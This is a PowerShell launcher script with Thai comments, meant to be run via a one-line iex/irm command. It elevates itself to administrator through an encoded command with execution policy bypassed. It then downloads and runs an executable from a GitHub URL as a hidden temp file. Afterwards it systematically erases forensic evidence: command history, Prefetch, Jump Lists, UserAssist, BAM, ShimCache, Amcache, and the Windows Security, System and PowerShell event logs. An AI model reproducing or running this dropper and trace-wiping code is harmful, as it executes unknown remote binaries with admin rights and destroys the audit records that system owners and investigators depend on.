# ════════════════════════════════════════════════════════════════
#  BEAMV2 — Self-Cleaning Launcher (Native EXE compatible)
#  Usage: iex (irm 'https://gitlab.com/USER/REPO/-/raw/main/run.ps1')
# ════════════════════════════════════════════════════════════════

# ── ปิด history ทันที ──────────────────────────────────────────
try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$null = Clear-History -ErrorAction SilentlyContinue
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
try { [IO.File]::WriteAllText($histFile,'') } catch {}

# ════════════════════════════════════════════════════════════════
#  CONFIG — แก้แค่บรรทัดนี้
# ════════════════════════════════════════════════════════════════
$exeUrl = "https://github.com/phongsathornmp-tech/strike/raw/refs/heads/main/version.exe"
# ════════════════════════════════════════════════════════════════

# ── PARENT: encode + spawn child Admin ─────────────────────────
if ($env:BV2_CHILD -ne "1") {

    $inner = "
`$env:BV2_CHILD='1'
`$exeUrl='$exeUrl'
iex (irm '$($MyInvocation.MyCommand.Path -replace "'","''")')
"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))

    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName        = "powershell.exe"
    $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64"
    $psi.Verb            = "runas"
    $psi.UseShellExecute = $true
    $psi.WindowStyle     = "Normal"

    try { $p = [Diagnostics.Process]::Start($psi); $p.WaitForExit() } catch {}

    # ล้าง parent history
    try { [IO.File]::WriteAllText($histFile,'') } catch {}
    try { Remove-Item $histFile -Force -EA SilentlyContinue } catch {}
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    $null = Clear-History -EA SilentlyContinue
    exit 0
}

# ════════════════════════════════════════════════════════════════
#  CHILD — โหลด + รัน native EXE
# ════════════════════════════════════════════════════════════════

# โหลด bytes → เขียน tmp ชื่อสุ่ม → รัน → ลบทันที
$tmp = [IO.Path]::Combine([IO.Path]::GetTempPath(), [Guid]::NewGuid().ToString("N") + ".tmp")
$ok  = $false

try {
    $wc = [Net.WebClient]::new()
    $wc.Headers["User-Agent"] = "Mozilla/5.0"
    [byte[]]$bytes = $wc.DownloadData($exeUrl)
    $wc.Dispose()

    # เขียนลง tmp
    [IO.File]::WriteAllBytes($tmp, $bytes)

    # zero-fill byte array ใน memory
    for ($i=0;$i -lt $bytes.Length;$i++) { $bytes[$i]=0 }
    $bytes = $null
    [GC]::Collect()

    # ตั้ง attribute hidden ก่อน
    [IO.File]::SetAttributes($tmp, [IO.FileAttributes]::Hidden)

    # รัน — ไม่ใส่ RunAs เพราะ child ได้ Admin แล้ว
    $psi2 = New-Object Diagnostics.ProcessStartInfo
    $psi2.FileName        = $tmp
    $psi2.UseShellExecute = $true
    $psi2.WindowStyle     = "Normal"

    $p2 = [Diagnostics.Process]::Start($psi2)
    $p2.WaitForExit()
    $ok = $true
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
    Start-Sleep 2
}

# ลบ tmp ทันที (overwrite ก่อน)
if (Test-Path $tmp) {
    try {
        $fs = [IO.File]::Open($tmp,'Open','Write')
        $z  = [byte[]]::new($fs.Length)
        $fs.Write($z,0,$z.Length)
        $fs.Close()
    } catch {}
    Remove-Item $tmp -Force -EA SilentlyContinue
}

# ════════════════════════════════════════════════════════════════
#  WIPE ALL TRACES
# ════════════════════════════════════════════════════════════════

function _WRV([string]$p) {
    if (-not (Test-Path $p)) { return }
    try { (Get-Item $p -EA Stop).Property | ForEach-Object {
        Remove-ItemProperty -Path $p -Name $_ -Force -EA SilentlyContinue } } catch {}
}

# [1] ConsoleHost_history
foreach ($h in @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)) {
    try {
        if (Test-Path $h) {
            $fs=[IO.File]::Open($h,'Open','Write')
            $z=[byte[]]::new([math]::Max($fs.Length,1))
            $fs.Write($z,0,$z.Length); $fs.Close()
            Remove-Item $h -Force -EA SilentlyContinue
        }
    } catch {}
}

# [2] Prefetch
$pf = "$env:SystemRoot\Prefetch"
"POWERSHELL*","CMD*" | ForEach-Object {
    Get-ChildItem $pf -Filter $_ -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue }

# [3] Recent + Jump Lists
Remove-Item "$([Environment]::GetFolderPath('Recent'))\*" -Force -Recurse -EA SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -EA SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"    -Force -EA SilentlyContinue

# [4] UserAssist
Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -EA SilentlyContinue |
    ForEach-Object { _WRV "$($_.PSPath)\Count" }

# [5] MUI Cache
_WRV "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"

# [6] MRU keys
@("HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"
) | ForEach-Object { Remove-Item $_ -Recurse -Force -EA SilentlyContinue }

# [7] BAM
$bam = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
if (Test-Path $bam) {
    Get-ChildItem $bam -EA SilentlyContinue | ForEach-Object {
        $n = $_.PSPath
        try { (Get-Item $n).Property |
            Where-Object { $_ -notmatch "^(Sequence|\(default\))$" } |
            ForEach-Object { Remove-ItemProperty -Path $n -Name $_ -Force -EA SilentlyContinue }
        } catch {}
    }
}

# [8] ShimCache
$shim = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
if (Test-Path $shim) {
    Remove-ItemProperty -Path $shim -Name "AppCompatCache" -Force -EA SilentlyContinue }

# [9] Amcache
$am = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache\InventoryApplicationFile"
if (Test-Path $am) {
    Get-ChildItem $am -EA SilentlyContinue | ForEach-Object {
        $lp=(Get-ItemProperty $_.PSPath -EA SilentlyContinue).LowerCaseLongPath
        if ($lp -match "powershell|\.tmp$|version\.exe") {
            Remove-Item $_.PSPath -Recurse -Force -EA SilentlyContinue } } }

# [10] Event Logs
@("Security","System","Application",
  "Microsoft-Windows-PowerShell/Operational",
  "Microsoft-Windows-TaskScheduler/Operational",
  "Microsoft-Windows-Shell-Core/Operational"
) | ForEach-Object { try { wevtutil cl "$_" 2>$null } catch {} }
try { [Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(
    "Microsoft-Windows-PowerShell/Operational") } catch {}

# [11] Temp cleanup
Get-ChildItem $env:TEMP -Filter "*.tmp" -EA SilentlyContinue |
    ForEach-Object { try { Remove-Item $_.FullName -Force -EA SilentlyContinue } catch {} }

# [12] env var + session
Remove-Item Env:BV2_CHILD -Force -EA SilentlyContinue
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$null = Clear-History -EA SilentlyContinue
try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}

[Console]::Clear()
